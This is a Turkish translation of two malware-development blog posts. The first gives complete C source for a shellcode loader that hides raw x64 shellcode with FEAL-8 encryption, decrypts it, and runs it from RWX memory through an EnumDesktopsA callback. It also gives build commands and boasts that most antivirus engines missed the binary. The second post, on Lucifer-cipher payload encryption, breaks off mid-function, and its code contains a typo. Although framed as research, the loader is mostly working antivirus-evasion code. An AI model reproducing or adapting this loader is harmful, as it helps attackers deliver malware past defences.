Anahtar Planlama (Key Schedule) fonksiyonu, ana şifreleme anahtarından (key) bir dizi tur alt anahtarı oluşturur. FEAL-8'in 8 turunun her biri için farklı bir alt anahtar oluşturulur. Her turda, anahtar planlama işlemi, anahtarın her baytı ile turun indeksi (i) ve bayt indeksinin (j) toplamı arasında bir XOR işlemi gerçekleştirir:
// key schedule for FEAL-8
void key_schedule(uint8_t* key) {
for (int i = 0; i < ROUNDS; i++) {
for (int j = 0; j < 8; j++) {
	K[i][j] = key[j] ^ (i + j);
}
}
}


Sonra,şifreleme mantığı:
// FEAL-8 encryption function
void feal8_encrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of encryption
for (int i = 0; i < ROUNDS; i++) {
	G(&left, &right, K[i]);
}

// final swapping of left and right
block[0] = right;
block[1] = left;
}
Bu fonksiyon, 64 bitlik bir veri bloğu üzerinde FEAL-8 şifrelemesi gerçekleştirir (veri bloğu iki 32 bitlik yarıya bölünür: sol ve sağ). 8 tur boyunca, her turda ilgili tur anahtarı ile G fonksiyonunu uygular.
Şifre çözme mantığı:
// FEAL-8 decryption function
void feal8_decrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];
// perform 8 rounds of decryption in reverse
for (int i = ROUNDS - 1; i >= 0; i--) {
	G(&left, &right, K[i]);
}

// final swapping of left and right
block[0] = right;
block[1] = left;
}
Ve shellcode şifreleme ve şifre çözme mantığı:
// function to encrypt shellcode using FEAL-8
void feal8_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // Generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
feal8_encrypt(ptr, key);
ptr += 2;
}
// handle remaining bytes by padding with 0x90 (NOP)
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{ 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
memcpy(pad, ptr, remaining);
feal8_encrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}

// function to decrypt shellcode using FEAL-8
void feal8_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // Generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
feal8_decrypt(ptr, key);
ptr += 2;
}
// handle remaining bytes with padding
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{ 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
memcpy(pad, ptr, remaining);
feal8_decrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}
İlk fonksiyon, verilen shellcode'u (bizim durumumuzda "meow-meow messagebox") FEAL-8 şifreleme ile şifrelemekten sorumludur. Shellcode, 64 bitlik bloklar (8 bayt) halinde işlenir ve tam bloğa uymayan kalan baytlar varsa, bunlar şifrelemeden önce 0x90 (NOP) ile doldurulur.
Son olarak, main fonksiyonu, FEAL-8 kullanarak shellcode'u şifreleme, şifresini çözme ve yürütme işlemlerini gösterir.
Her zamanki gibi meow-meow messagebox payload'u kullandım:
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

Ve şifresi çözülen payload, EnumDesktopsA fonksiyonu kullanılarak çalıştırılır.
Tam kaynak kodu şu şekildedir (hack.c):
/*
* hack.c
* encrypt/decrypt payload via FEAL-8 algorithm
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/09/12/malware-cryptography-32.html
*/

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 8 // FEAL-8 uses 8 rounds of encryption
#define BLOCK_SIZE 8 // FEAL-8 operates on 64-bit (8-byte) blocks

// subkeys generated from the main key
uint8_t K[ROUNDS][8];

// rotate left 1 bit
uint32_t rotl(uint32_t x, int shift) {
	return (x << shift) | (x >> (32 - shift));
}

// function F used in FEAL-8
uint32_t F(uint32_t x1, uint32_t x2) {
	return rotl((x1 ^ x2), 2);
}

// function G used in FEAL-8
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
uint32_t tempLeft = *left;
*left = *right;
*right = tempLeft ^ F(*left, *right) ^ *(uint32_t*)roundKey;
}

// key schedule for FEAL-8
void key_schedule(uint8_t* key) {
for (int i = 0; i < ROUNDS; i++) {
for (int j = 0; j < 8; j++) {
	K[i][j] = key[j] ^ (i + j);
}
}
}

// FEAL-8 encryption function
void feal8_encrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of encryption
for (int i = 0; i < ROUNDS; i++) {
	G(&left, &right, K[i]);
}

// final swapping of left and right
block[0] = right;
block[1] = left;
}

// FEAL-8 decryption function
void feal8_decrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of decryption in reverse
for (int i = ROUNDS - 1; i >= 0; i--) {
	G(&left, &right, K[i]);
}

// final swapping of left and right
block[0] = right;
block[1] = left;
}

// function to encrypt shellcode using FEAL-8
void feal8_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // Generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
feal8_encrypt(ptr, key);
ptr += 2;
}
// handle remaining bytes by padding with 0x90 (NOP)
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{ 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
memcpy(pad, ptr, remaining);
feal8_encrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}


// function to decrypt shellcode using FEAL-8
void feal8_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // Generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
feal8_decrypt(ptr, key);
ptr += 2;
}
// handle remaining bytes with padding
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{ 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
memcpy(pad, ptr, remaining);
feal8_decrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}
int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len + (BLOCK_SIZE - my_payload_len % BLOCK_SIZE) %
BLOCK_SIZE;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len); // pad with NOPs
memcpy(padded, my_payload, my_payload_len);

printf("original shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

uint8_t key[8] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

feal8_encrypt_shellcode(padded, pad_len, key);

printf("encrypted shellcode:\n");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

feal8_decrypt_shellcode(padded, pad_len, key);

printf("decrypted shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

// allocate and execute decrypted shellcode
LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);

return 0;
}
Bu örnek, FEAL-8 şifreleme algoritmasının payload'u şifrelemek ve şifresini çözmek için nasıl kullanılacağını göstermektedir. Doğruluğu kontrol etmek için eklenen yazdırma mantığı bulunmaktadır.
Demo
Şimdi her şeyi çalışırken görelim. Derleyelim (Linux makinemde):
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, sadece mağdurun makinesinde (benim durumumda Windows 11 x64) çalıştırın:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı!=..=
Shannon entropisini hesaplama:
python3 entropy.py -f hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
.text bölümündeki payload’umuz.
Şimdi bu hack.exe dosyasını VirusTotal'a yükleyelim:
+++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/08a7fba2d86f2ca8b9431695f8b530be7ad546e3f7467978bd6ff003b7f9508c/detection

Gördüğünüz gibi, 74 antivirüs motorundan yalnızca 25’i dosyamızı kötü amaçlı olarak tespit etti.
Kriptoanaliz
Tarihsel olarak, dört turlu FEAL olan FEAL-4, seçilmiş açık metin saldırısıyla başarıyla analiz edilip yok edilmiştir. Sean Murphy’nin daha sonraki yaklaşımı, yalnızca 20 seçilmiş açık metin gerektiren bilinen ilk diferansiyel kriptanaliz saldırısıydı.
Tasarımcılar, 8 turlu FEAL ile yanıt verdiler ancak Biham ve Shamir, bunu SECURICOM '89 konferansında kriptanaliz etti (A. Shamir ve A. Fiat, "Method, Apparatus and Article for Identification and Signature," U.S. Patent #4,748,668, 31 Mayıs 1988).
FEAL-8'e yönelik başka bir seçilmiş açık metin saldırısı (H. Gilbert ve G. Chase, "A Statistical Attack on the Feal-8 Cryptosystem," Advances in Cryptology—CRYPTO’90 Proceedings, Springer–Verlag, 1991, s. 22–33), sadece 10.000 blok kullanarak yaratıcılarını FEAL-N’yi tanımlamaya zorladı. FEAL-N, değişken sayıda tur içermektedir (elbette 8’den fazla).
Biham ve Shamir, diferansiyel kriptanaliz kullanarak FEAL-N'yi kaba kuvvetten daha hızlı kırmayı başardı (2^64 seçilmiş açık metin şifrelemeleriyle) ve N < 32 için kırılabilir olduğunu gösterdi. FEAL-16’nın kırılması için 2^28 seçilmiş açık metin veya 2^46.5 bilinen açık metin gerekiyordu. FEAL-8’in kırılması için 2000 seçilmiş açık metin veya 2^37.5 bilinen açık metin gerekiyordu. FEAL-4, yalnızca sekiz dikkatlice seçilmiş açık metinle kırılabiliyordu.
Bu yazının, kötü amaçlı yazılım araştırmacıları ve C/C++ programcıları için faydalı olmasını umuyorum. Aynı zamanda, mavi takımın bu ilginç şifreleme tekniğine karşı farkındalığını artırarak kırmızı takımın cephaneliğine yeni bir araç eklediğini düşünüyorum.
FEAL-8 encryption
Malware and cryptography 1
Github’taki kaynak kod

96. kötü amaçlı yazılım ve kriptografi araştırması - bölüm 5 (33): Lucifer algoritmasıyla payload şifreleme. Basit C örneği.

﷽
Merhaba, siber güvenlik meraklıları ve beyaz hackerlar!

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, Lucifer blok şifreleyicisinin kötü amaçlı yazılım geliştirmede kullanımı üzerine kendi araştırmamın bir sonucudur. Her zamanki gibi, çeşitli kripto algoritmalarını keşfederken, bunu şifreleme/şifre çözme için uygularsak ne olacağını kontrol etmeye karar verdim.
Feistel ağları

Okuyucularımın isteği üzerine, Feistel ağının ne olduğunu hatırlatmak istiyorum. Bu, modern kriptografi ve şifreleme sistemlerinde hayati bir rol oynayan çok önemli bir kavramdır.
Feistel ağı, 1971 yılında IBM Laboratuvarlarında Horst Feistel tarafından oluşturulan bir blok şifreleme tekniğidir.
Feistel ağı, her bloğu sol (𝐿) ve sağ (𝑅) alt bloklar olmak üzere iki eşit parçaya bölen bir blok şifreleme yapısıdır. Sol alt blok şu fonksiyon kullanılarak dönüştürülür:


𝑥 = 𝑓(𝐿, 𝐾)


burada 𝐾 anahtarı temsil eder. Bu fonksiyon, bir kaydırma şifrelemesi gibi herhangi bir kriptografik işlem olabilir.
Dönüştürülen sol alt blok daha sonra değiştirilmemiş sağ alt blok ile XOR işlemine tabi tutulur: 𝑥 = 𝑥 ⊕ 𝑅.
Bundan sonra, sol ve sağ alt bloklar yer değiştirir ve işlem birkaç tur boyunca tekrar eder.
Sonuç olarak şifrelenmiş veri elde edilir.
Lucifer


Lucifer, 1970'lerde IBM'de Horst Feistel tarafından oluşturulan en eski blok şifreleyicilerden biridir.
128-bit bloklar üzerinde çalışan ve Feistel ağı kullanan simetrik anahtar şifreleyicisidir. Bu yapı, daha sonra daha popüler olan Veri Şifreleme Standardı (DES) için temel oluşturmuştur.


Lucifer şifrelemesinde, düz metin iki segmente ayrılır; bir segment dönüştürülür ve ortaya çıkan çıktı diğer segment ile XOR işlemine tabi tutulur. Bu işlem, güvenliği sağlamak için S-kutuları, permütasyonlar ve anahtar planları kullanılarak birkaç kez tekrarlanır.


Lucifer’in S-kutuları 4-bit girişleri alır ve 4-bit çıkışlar üretir; S-kutularının girdisi, önceki turdaki S-kutularının bit-permute edilmiş çıktısından türetilirken, başlangıç turundaki girdisi düz metindir.
Önemli bir bit, iki mevcut S-kutusundan belirli birini seçmek için kullanılır.
Lucifer, 9 giriş biti ve 8 çıkış biti olan tek bir T-kutusu olarak gösterilir.
DES'in aksine, turlar arasında değişim yoktur ve blok yarıları kullanılmaz.
Lucifer, 16 tur kullanır, 128-bit bloklarla çalışır ve DES'e kıyasla daha az karmaşık bir anahtar planına sahiptir.
pratik örnek 1

Bunu pratikte uygulayalım. Öncelikle, yardımcı fonksiyonları, sabitleri ve makroları tanımlamamız gerekiyor:
#define block_size 16 // 128 bit
#define key_size 16 // 128 bit
static const unsigned char s0[16] = {
0x0C, 0x0F, 0x07, 0x0A, 0x0E, 0x0D, 0x0B, 0x00,
0x02, 0x06, 0x03, 0x01, 0x09, 0x04, 0x05, 0x08
};
static const unsigned char s1[16] = {
	0x07, 0x02, 0x0E, 0x09, 0x03, 0x0B, 0x00, 0x04,
	0x0C, 0x0D, 0x01, 0x0A, 0x06, 0x0F, 0x08, 0x05
};
static const unsigned char m1[8] = {
	0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01
};
static const unsigned char m2[8] = {
	0x7F, 0xBF, 0xDF, 0xEF, 0xF7, 0xFB, 0xFD, 0xFE
};

// macro to perform bitwise shifts
#define shift_left(x, n) ((x) << (n))
#define shift_right(x, n) ((unsigned char)(x) >> (n))

// extract high and low nibbles
#define highsubbyte(x) shift_right((x), 4)
#define lowsubbyte(x) ((x) & 0x0F)

// swap function for char types
void swap(char* arg1, char* arg2) {
	char tmp = *arg1;
	*arg1 = *arg2;
	*arg2 = tmp;
}
Daha sonra, ana şifreleme fonksiyonuna ihtiyacımız var.
Lucifer şifreleme fonksiyonumuzu adım adım açıklayalım.

Bu fonksiyon, 128-bit bir blok (16 bayt) ve bir anahtar alır. Blok, iki eşit yarıya bölünür: lower_half (ilk 8 bayt) ve upper_half (son 8 bayt):
char* lower_half = block;
char* upper_half = block + block_size / 2;

Şifre çözme işlemi yapılıyorsa, başlangıçtaki anahtar bayt indeksi 8 olarak ayarlanır; aksi takdirde 0'dan başlar.
Şifreleme veya şifre çözme sırasında toplam 16 tur gerçekleştirilir:
int key_byte_idx = decrypt ? 8 : 0;
const int round_count = 16;
16 tur boyunca dönüşümler için bir döngü başlatılır. Şifre çözme işlemi yapılıyorsa, anahtar indeksi her turdan sonra 1 artırılır ve 16'ya ulaştığında modül işlemiyle sıfırlanır:
for (int round = 0; round < round_count; ++round) {
if (decrypt) 
key_byte_idx = (key_byte_idx + 1) % round_count;
}
Her turda, upper_half içindeki her bayt için 8 adım işlenir.
Burada, message_byte işlenen bayttır:
for (int step = 0; step < 8; ++step) {char message_byte = upper_half[step];}
Bu blok, karmaşıklık adımını uygular. Anahtar baytına ve adıma bağlı olarak, message_byte değerini değiştirmek için s0 veya s1 yerine koyma kutularından hangisinin kullanılacağını belirleriz.Bu işlem, Feistel ağlarındaki S-kutularına benzer bir süreçtir:
if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0[lowsubbyte
(message_byte)];
} else {
message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1[lowsubbyte
(message_byte)];
}
Daha sonra, anahtar kesme mantığı uygulanır:
message_byte ^= key[key_byte_idx];
Burada, dönüştürülmüş bayt, anahtar baytı ile XOR işlemine tabi tutulur. Bu, şifrelemeye ek karmaşıklık katar ve mesajın her baytının anahtar tarafından etkilenmesini sağlar.


Sonraki adım, message_byte içindeki bitlerin önceden tanımlanmış maskelere (m1) göre sola veya sağa kaydırıldığı permütasyon adımıdır.
Bu adım, her bitin tüm bayt üzerinde etkisini yayarak karıştırma işlemi gerçekleştirir:
message_byte =
	 (shift_right(message_byte & m1[0], 3)) |
	(shift_right(message_byte & m1[1], 4)) |
	(shift_left(message_byte & m1[2], 2)) |
	(shift_right(message_byte & m1[3], 1)) |
	(shift_left(message_byte & m1[4], 2)) |
	(shift_left(message_byte & m1[5], 4)) |
	(shift_right(message_byte & m1[6], 1)) |
	(shift_left(message_byte & m1[7], 1));
Elde edilen message_byte, lower_half içindeki çeşitli bitler ile XOR işlemine tabi tutulur.
Bu, lower_half içindeki değişikliklerin yayılmasını sağlar ve blok yarılarının birbirini etkilemesini garanti eder:
lower_half[(7 + step) % step_count] =
((message_byte ^ lower_half[(7 + step) % step_count]) &
m1[0]) | (lower_half[(7 + step) % step_count] & m2[0]);
// repeat similar logic for other bits...
Daha sonra, key_byte_idx artırılarak bir sonraki adımda farklı bir anahtar baytının kullanılması sağlanır.Şifreleme yapılıyorsa, bu adım son adım hariç her adımda gerçekleşir:
if (step < step_count - 1 || decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
}


Her turun sonunda, lower_half ve upper_half yer değiştirir.
Bu, Feistel ağı tasarımının önemli bir parçasıdır ve bir sonraki turda her iki bloğun da işlenmesini sağlar:

for (int i = 0; i < block_size / 2; ++i) {
	swap(&lower_half[i], &upper_half[i]);
}

Tüm turlar tamamlandıktan sonra, bölümler tekrar değiştirilir ve şifreleme işlemi sona erer.
Bu, Feistel tasarımına uygun şekilde nihai şifrelenmiş bloğun oluşmasını sağlar:
for (int i = 0; i < block_size / 2; ++i) {
	swap(&block[i], &block[i + block_size / 2]);
}

Bu fonksiyonun tam kaynak kodu şu şekilde görünüyor:

void Lucifer(char block[block_size], char key[key_size], bool decrypt) {
char* lower_half = block;
char* upper_half = block + block_size / 2;
int key_byte_idx = decrypt ? 8 : 0;
const int round_count = 16;
for (int round = 0; round < round_count; ++round) {
if (decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
}

int transform_control_byte_idx = key_byte_idx;
const int step_count = 8;

for (int step = 0; step < step_count; ++step) {
char message_byte = upper_half[step];

// confusion
if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0
[lowsubbyte(message_byte)];
} else {
message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1
[lowsubbyte(message_byte)];
}

// key interruption
message_byte ^= key[key_byte_idx];

// permutation
message_byte =      (shift_right(message_byte & m1[0], 3)) |
(shift_right(message_byte & m1[1], 4)) |
(shift_left(message_byte & m1[2], 2)) |
(shift_right(message_byte & m1[3], 1)) |
(shift_left(message_byte & m1[4], 2)) |
(shift_left(message_byte & m1[5], 4)) |
(shift_right(message_byte & m1[6], 1)) |
(shift_left(message_byte & m1[7], 1));
// diffusion
hlower_half[(7 + step) % step_count] = ((message_byte ^ lower_half[(7 +
step) % step_count]) & m1[0]) | (lower_half[(7 + step) % step_count] &
m2[0]);
lower_half[(6 + step) % step_count] = ((message_byte ^ lower_half[(6 +
step) % step_count]) & m1[1]) | (lower_half[(6 + step) % step_count] &
m2[1]);
lower_half[(2 + step) % step_count] = ((message_byte ^ lower_half[(2 +
step) % step_count]) & m1[2]) | (lower_half[(2 + step) % step_count] &
m2[2]);
lower_half[(1 + step) % step_count] = ((message_byte ^ lower_half[(1 +
step) % step_count]) & m1[3]) | (lower_half[(1 + step) % step_count] &
m2[3]);
lower_half[(5 + step) % step_count] = ((message_byte ^ lower_half[(5 +
step) % step_count]) & m1[4]) | (lower_half[(5 + step) % step_count] &
m2[4]);
lower_half[(0 + step) % step_count] = ((message_byte ^ lower_half[(0 +
step) % step_count]) & m1[5]) | (lower_half[(0 + step) % step_count] &
m2[5]);
lower_half[(3 + step) % step_count] = ((message_byte ^ lower_half[(3 +
step) % step_count]) & m1[6]) | (lower_half[(3 + step) % step_count] &
m2[6]);
lower_half[(4 + step) % step_count] = ((message_byte ^ lower_half[(4 +
step) % step_count]) & m1[7]) | (lower_half[(4 + step) % step_count] &
m2[7]);

if (step < step_count - 1 || decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
		}
	   } 

// swap halves
for (int i = 0; i < block_size / 2; ++i) {
	swap(&lower_half[i], &upper_half[i]);
}
	}
// physically swap halves
for (int i = 0; i < block_size / 2; ++i) {
swap(&block[i], &block[i + block_size / 2]);
}
}
Bu fonksiyon, 128-bit bir bloğu 16 tur boyunca karıştırma, yayılma ve permütasyon işlemlerine tabi tutar.
Her turda, upper_half içindeki baytlar değiştirilir ve lower_half içine değişiklikler yayılır.
Anahtar, her adımda S-kutusu değiştirme ve XOR işlemlerini kontrol etmek için kullanılır.
Blok yarıları, her turun sonunda yer değiştirir ve Feistel ağı tasarımına uygun olarak işlenir.


Son olarak, düz metin bloğunu nasıl şifreleyebileceğimizi gösteren tam kaynak kodu şu şekildedir (hack.c):
/*
* hack.c
* Lucifer encryption example
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/10/20/malware-cryptography-33.html
*/
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#define block_size 16 // 128 bit
#define key_size 16 // 128 bit
static const unsigned char s0[16] = {
0x0C, 0x0F, 0x07, 0x0A, 0x0E, 0x0D, 0x0B, 0x00,
0x02, 0x06, 0x03, 0x01, 0x09, 0x04, 0x05, 0x08
};
static const unsigned char s1[16] = {
	0x07, 0x02, 0x0E, 0x09, 0x03, 0x0B, 0x00, 0x04,
	0x0C, 0x0D, 0x01, 0x0A, 0x06, 0x0F, 0x08, 0x05
};
static const unsigned char m1[8] = {
	0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01
};
static const unsigned char m2[8] = {
	0x7F, 0xBF, 0xDF, 0xEF, 0xF7, 0xFB, 0xFD, 0xFE
};

// macro to perform bitwise shifts
#define shift_left(x, n) ((x) << (n))
#define shift_right(x, n) ((unsigned char)(x) >> (n))

// extract high and low nibbles
#define highsubbyte(x) shift_right((x), 4)
#define lowsubbyte(x) ((x) & 0x0F)

// swap function for char types
void swap(char* arg1, char* arg2) {
	char tmp = *arg1;
	*arg1 = *arg2;
	*arg2 = tmp;
}
void Lucifer(char block[block_size], char key[key_size], bool decrypt) {
char* lower_half = block;
char* upper_half = block + block_size / 2;
int key_byte_idx = decrypt ? 8 : 0;
const int round_count = 16;
for (int round = 0; round < round_count; ++round) {
if (decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
}

int transform_control_byte_idx = key_byte_idx;
const int step_count = 8;

for (int step = 0; step < step_count; ++step) {
char message_byte = upper_half[step];

// confusion
if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0
[lowsubbyte(message_byte)];
} else {
message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1
[lowsubbyte(message_byte)];
}

// key interruption
message_byte ^= key[key_byte_idx];

// permutation
message_byte =      (shift_right(message_byte & m1[0], 3)) |
(shift_right(message_byte & m1[1], 4)) |
(shift_left(message_byte & m1[2], 2)) |
(shift_right(message_byte & m1[3], 1)) |
(shift_left(message_byte & m1[4], 2)) |
(shift_left(message_byte & m1[5], 4)) |
(shift_right(message_byte & m1[6], 1)) |
(shift_left(message_byte & m1[7], 1));
// diffusion
hlower_half[(7 + step) % step_count] = ((message_byte ^ lower_half[(7 +
step) % step_count]) & m1[0]) | (lower_half[(7 + step) % step_count] &
m2[0]);
lower_half[(6 + step) % step_count] = ((message_byte ^ lower_half[(6 +
step) % step_count]) & m1[1]) | (lower_half[(6 + step) % step_count] &
m2[1]);
lower_half[(2 + step) % step_count] = ((message_byte ^ lower_half[(2 +
step) % step_count]) & m1[2]) | (lower_half[(2 + step) % step_count] &
m2[2]);
lower_half[(1 + step) % step_count] = ((message_byte ^ lower_half[(1 +
step) % step_count]) & m1[3]) | (lower_half[(1 + step) % step_count] &
m2[3]);
lower_half[(5 + step) % step_count] = ((message_byte ^ lower_half[(5 +
step) % step_count]) & m1[4]) | (lower_half[(5 + step) % step_count] &
m2[4]);
lower_half[(0 + step) % step_count] = ((message_byte ^ lower_half[(0 +
step) % step_count]) & m1[5]) | (lower_half[(0 + step) % step_count] &
m2[5]);
lower_half[(3 + step) % step_count] = ((message_byte ^ lower_half[(3 +
step) % step_count]) & m1[6]) | (lower_half[(3 + step) % step_count] &
m2[6]);
lower_half[(4 + step) % step_count] = ((message_byte ^ lower_half[(4 +
